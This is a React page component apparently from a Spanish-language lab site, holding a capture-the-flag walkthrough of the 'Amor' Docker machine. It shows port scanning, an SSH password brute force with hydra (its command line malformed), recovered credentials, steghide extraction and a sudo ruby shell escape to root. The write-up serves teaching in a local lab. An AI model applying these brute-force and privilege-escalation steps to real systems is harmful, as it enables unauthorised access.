import CodeBash from "@/components/CodeBash";
import labs from "../labs";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from "@/components/ui/breadcrumb";
import { ChevronDown, Slash } from "lucide-react";
import { Link } from "react-router-dom";
function Amor() {
  const lastPath = location.pathname.split("/").filter(Boolean).pop();
  return (
    <div>
      <Breadcrumb>
        <BreadcrumbList>
          <BreadcrumbItem>
            <Link to="/">Home</Link>
          </BreadcrumbItem>
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <DropdownMenu>
              <DropdownMenuTrigger className="flex items-center gap-1">
                Docker Labs
                <ChevronDown className="h-4 w-4" />
              </DropdownMenuTrigger>
              <DropdownMenuContent align="start">
                {labs.map((lab) => (
                  <Link
                    to={
                      "/docker-labs/" + lab.toLowerCase().split(" ").join("-")
                    }
                  >
                    <DropdownMenuItem key={lab}>{lab}</DropdownMenuItem>
                  </Link>
                ))}
              </DropdownMenuContent>
            </DropdownMenu>
          </BreadcrumbItem>{" "}
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <BreadcrumbPage className="text-primary">
              {lastPath!.at(0)!.toUpperCase() + lastPath!.substring(1)}
            </BreadcrumbPage>
          </BreadcrumbItem>
        </BreadcrumbList>
      </Breadcrumb>
      <div className="flex items-center flex-col">
        <h1 className="text-5xl mt-3 mb-5 font-bold">Amor</h1>
        <div className="md:px-48 w-full">
          <h2 className="my-2 text-3xl font-bold">
            Comenzamos inicializando la maquina
          </h2>
          <CodeBash text="sudo bash auto_deploy.sh amor.tar" />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Escaneo de puertos</h2>
          <p>Vamos a empezar el escaneo de puertos usando nmap</p>
          <CodeBash text="nmap -p- --open 172.17.0.2 -Pn" />
          <p>Este es el resultado del escaneo</p>
          <CodeBash
            text="Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-04 17:31 -05
Nmap scan report for 172.17.0.2
Host is up (0.000036s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Puerto 80</h2>
          <p>
            En el puerto 80 se ve una pagina que tiene datos interesantes, como
            el siguiente:
          </p>
          <CodeBash
            text="¡Importante! Despido de empleado Juan fue despedido de la empresa
            por enviar un correo con la contraseña a un compañero. Firmado:
            Carlota, Departamento de ciberseguridad"
          />
          <p>
            Nos damos cuenta que hay posibles usuarios: juan, Juan , carlota,
            Carlota
          </p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Hacemos un ataque de fuerza bruta al puerto 22 usando hydra
          </h2>
          <CodeBash text="hydra -l users.txt -P /usr/share/wordlists/rockyou.txt" />
          <p>De resultado tenemos lo siguiente</p>
          <CodeBash
            text="[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
1 of 1 target successfully completed, 1 valid password found"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Conectamos por ssh</h2>
          <CodeBash
            text="ssh carlota@172.17.0.2
carlota@172.17.0.2's password: babygirl
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.1-arch1-1 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
$"
          />
          <p>
            Navegamos un poco por el entorno y vemos la existencia de otro
            usuario
          </p>
          <CodeBash
            text="$ ls
Desktop
$ cd ..
$ ls
carlota  oscar	ubuntu
$"
          />
          <p>
            Seguimos explorando el entorno y revisamos el contenido de la
            carpeta Desktop
          </p>
          <CodeBash
            text="$ cd carlota
$ cd Desktop
$ ls
fotos
$ cd fotos
$ ls
vacaciones
$ cd vacaciones
$ ls
imagen.jpg"
          />
          <p>
            Usamos scp para descargar el contenido de la carpeta y revisar la
            imagen
          </p>
          <CodeBash text="scp -r carlota@172.17.0.2:/home/carlota/ ./" />
          <p>
            Revisando el contenido podemos apreciar una imagen de dos personas
            juntas, usaremos el siguiente comando
          </p>
          <CodeBash
            text='steghide extract -sf imagen.jpg
Enter passphrase:
wrote extracted data to "secret.txt".'
          />
          <p>El contenido de este txt es el siguiente:</p>
          <CodeBash text="ZXNsYWNhc2FkZXBpbnlwb24=" />
          <p>
            Es un codigo en base64, lo desencriptamos en la pagina{" "}
            <a href="https://www.base64decode.org/es/">
              www.base64decode.org
            </a>{" "}
            Siendo el resultado el siguiente
          </p>
          <CodeBash text="eslacasadepinypon" />
          <p>
            Usamos esa contraseña para intentar conectarnos a el otro usuario
            oscar
          </p>
          <CodeBash
            text="ssh oscar@172.17.0.2
oscar@172.17.0.2's password: eslacasadepinypon
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.1-arch1-1 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de privilegios
          </h2>
          <p>
            Comenzamos revisando los comandos que podemos usar para el escalado
          </p>
          <CodeBash
            text="sudo -l
Matching Defaults entries for oscar on ee06f232d835:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User oscar may run the following commands on ee06f232d835:
    (ALL) NOPASSWD: /usr/bin/ruby"
          />
          <p>
            Vemos que podemos usar ruby como root, entonces revisamos su
            referencia en{" "}
            <a href="https://gtfobins.github.io/gtfobins/ruby/">GTFOBINS</a>
          </p>
          <p>Luego de leer esto usamos el siguiente comando</p>
          <CodeBash text={`sudo /usr/bin/ruby -e 'exec "/bin/sh"'`} />
          <p>Y eso es todo!!!! Conseguimos acceso root en la maquina</p>
          <CodeBash
            text="# whoami
root
#"
          />
        </div>
      </div>
    </div>
  );
}

export default Amor;
